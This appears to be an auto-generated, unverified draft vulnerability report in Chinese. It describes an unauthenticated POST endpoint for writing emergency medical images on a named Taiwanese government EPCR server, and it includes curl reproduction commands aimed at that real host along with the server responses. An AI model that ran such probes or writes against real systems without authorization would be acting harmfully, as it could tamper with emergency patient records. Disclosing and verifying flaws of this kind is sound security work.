# POC/EXP — epcr.tpf.gov.tw:4001 /imageData POST 未鉴权写端点可触发急救影像写入

> 漏洞ID: `e87594ee-2806-4f7a-9ee9-67155bd79e61`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/imageData（POST 未鉴权写端点）`

**類型**: 未鉴权写操作（Broken Access Control）

## 描述

EPCR vitalSignVideoServer（:4001）的 /imageData 端点支持 POST 方法且未做身份/权限校验（无 token 即可调用），必填字段 fileName/fileData/generatedAt。未鉴权 POST 返回 400 notNull Violation（列出三个必填字段），与 /videoData POST 行为完全一致，证明 /imageData POST 端点存在且未鉴权。该端点用于急救影像（含心电图 ECG）的数据写入，未鉴权即可触发后端写入逻辑。

## POC / 復現步驟

```
1. POST /imageData（无 token）：
curl -sSk -X POST -H "Content-Type: application/json" -d '{}' https://epcr.tpf.gov.tw:4001/imageData
→ 400 337B {"message":"notNull Violation: fileName cannot be null,\nnotNull Violation: fileData cannot be null,\nnotNull Violation: generatedAt cannot be null","errors":[{"field":"fileName","message":"fileName cannot be null"},{"field":"fileData",...
2. 对照 /videoData POST（无 token）：
POST /videoData -d '{}' → 400 337B 相同 notNull Violation（fileName/fileData/generatedAt）
3. 对照 4000 的 MCi API（/MciPcrs 等）未带 token 均 401 183B，而 4001 /imageData POST 无 token 返回 400 业务校验错误（非 401 鉴权拒绝），证明未鉴权可达。
4. PUT/DELETE/PATCH /imageData → 404 160B（仅 POST 有效）
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
